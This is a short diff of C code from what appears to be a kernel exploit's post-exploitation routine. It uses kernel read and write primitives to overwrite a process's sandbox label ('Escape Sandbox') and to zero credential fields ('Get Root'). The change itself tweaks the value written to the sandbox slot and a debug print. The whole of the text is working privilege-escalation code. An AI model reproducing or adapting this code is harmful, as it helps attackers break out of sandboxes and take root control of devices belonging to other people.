@@ -43,7 +43,7 @@ void postExploit(void) {
     printf("sandbox: %llx\n", kread64(label + 0x10));
     printf("sandbox: %u\n", kread32(label + 0x10));
     //Escape Sandbox
-    kwrite64(label + 0x10, 0xffffffffffffffff);
+    kwrite64(label + 0x10, 0);
     printf("sandbox: %llx\n", kread64(label + 0x10));
     printf("sandbox: %u\n", kread32(label + 0x10));
     //Get Root
@@ -58,7 +58,7 @@ void postExploit(void) {
     kwrite32(ucred + off_u_cr_groups, 0);
     kwrite32(ucred + off_u_cr_rgid, 0);
     kwrite32(ucred + off_u_cr_svgid, 0);
-    printf("Done! 4\n");
+    printf("Done! 5\n");
     printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
 }
 
